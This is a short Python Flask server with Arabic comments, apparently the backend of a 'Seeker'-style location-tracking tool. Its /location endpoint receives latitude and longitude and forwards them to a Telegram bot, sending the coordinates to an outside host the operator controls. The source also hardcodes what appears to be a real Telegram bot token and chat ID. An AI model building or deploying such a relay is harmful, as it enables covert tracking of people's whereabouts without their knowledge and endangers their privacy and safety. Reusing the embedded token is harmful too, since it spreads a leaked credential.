import requests
from flask import Flask, request

app = Flask(__name__)

# بيانات البوت واليوزر
TG_TOKEN = "7961048427:AAFjlXzCR9F7W4QK2k4S5Iw3COnZlbtlq4Y"
CHAT_ID = "7961048427"
TG_API = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"

@app.route("/")
def index():
    return "Seeker is running!"

@app.route("/location", methods=["POST"])
def location():
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    msg = f"📍 موقع جديد\nخط العرض: {lat}\nخط الطول: {lon}"
    print("🚀 Sending to Telegram:", msg)
    response = requests.get(TG_API, params={"chat_id": CHAT_ID, "text": msg})
    print("📩 Telegram response:", response.text)
    return {"status": "تم الاستلام"}
